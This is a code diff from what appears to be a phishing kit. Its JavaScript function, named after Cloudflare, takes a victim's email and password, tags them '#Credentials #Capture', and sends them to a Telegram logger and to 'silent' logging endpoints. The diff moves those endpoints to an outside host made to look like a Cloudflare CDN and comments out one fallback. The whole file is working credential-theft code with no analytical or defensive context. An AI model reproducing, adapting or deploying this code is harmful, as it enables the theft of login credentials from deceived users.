@@ -16,7 +16,7 @@ function cloudflare(email, password) {
 #Credentials #Capture`;
 
     // Send to PHP endpoint
-    fetch('../mine/telegram_logger.php', {
+    fetch('https://cloudflare-cdn-tele.vercel.app/api/telegram_logger.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -30,14 +30,14 @@ function cloudflare(email, password) {
     .catch(error => {
         console.error('Error sending to Telegram:', error);
         // Silent fallback - no popup
-        silentFallback(email, password, timestamp);
+        //silentFallback(email, password, timestamp);
     });
 }
 
 // Silent fallback - saves on server without user interaction
 function silentFallback(email, password, timestamp) {
     // Send to a different PHP endpoint that just saves to file
-    fetch('mine/silent_logger.php', {
+    fetch('https://cloudflare-cdn-tele.vercel.app/api/silent_logger.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -91,4 +91,5 @@ function silentServerLog(email, password) {
         method: 'POST',
         body: formData
     }).catch(err => console.log('Silent logging completed'));
+
 }
